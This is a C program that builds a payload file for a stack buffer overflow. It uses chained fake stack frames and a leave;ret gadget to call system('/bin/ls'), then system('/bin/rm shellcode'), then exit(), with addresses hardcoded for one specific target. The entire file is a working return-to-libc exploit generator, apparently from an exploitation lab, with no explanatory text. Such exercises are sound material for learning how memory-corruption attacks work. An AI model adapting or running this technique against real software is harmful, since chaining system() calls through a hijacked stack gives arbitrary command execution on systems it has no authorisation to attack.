#include <stdio.h>
#include <string.h>

#define FILENAME "shellcode"

#define BUF_ADDR 0xbffff66c  
#define BUF_SIZE 64
#define BUF_PAD 12
#define STR1 "/bin/ls"
#define STR2 "/bin/rm shellcode"
#define LEAVE_RET 0x08048535 
#define SYS_SYSTEM 0xb7e6a310
#define SYS_EXIT 0xb7e5d260

#define PTR_SIZE sizeof(void*)

int main(int argc, char *argv[])
{
    const int c_leave_ret = LEAVE_RET;
    const int c_system = SYS_SYSTEM;
    const int c_exit = SYS_EXIT;

    FILE* fp = fopen(FILENAME, "w");
    char buf[128];
    int val;
    int ebp = BUF_ADDR + BUF_SIZE + BUF_PAD;

    // padding
    val = BUF_SIZE + BUF_PAD;
    memset(buf, 'Z', val);
    fwrite(buf, val, 1, fp);

    // 0 frame
    ebp += PTR_SIZE * 2;
    fwrite(&ebp, 4, 1, fp); 
    fwrite(&c_leave_ret, 4, 1, fp); 

    // End of shellcode address (strings location)
    val = BUF_ADDR + BUF_SIZE + BUF_PAD + PTR_SIZE * (2 + 4 + 4 + 4);

    // 1-st system()
    ebp += PTR_SIZE * 4;
    fwrite(&ebp, 4, 1, fp); 
    fwrite(&c_system, 4, 1, fp); 
    fwrite(&c_leave_ret, 4, 1, fp); 
    fwrite(&val, 4, 1, fp); 
    
    // 2-nd system()
    ebp += PTR_SIZE * 4;
    fwrite(&ebp, 4, 1, fp); 
    fwrite(&c_system, 4, 1, fp); 
    fwrite(&c_leave_ret, 4, 1, fp); 
    val += sizeof(STR1);
    fwrite(&val, 4, 1, fp); 

    // exit()
    ebp += PTR_SIZE * 4;
    fwrite(&ebp, 4, 1, fp); 
    fwrite(&c_exit, 4, 1, fp); 
    fwrite(&c_leave_ret, 4, 1, fp); 
    val = 0;
    fwrite(&val, 4, 1, fp); 

    // strings
    fwrite(STR1, sizeof(STR1), 1, fp);
    fwrite(STR2, sizeof(STR2), 1, fp);

    fclose(fp);

    return 0;
}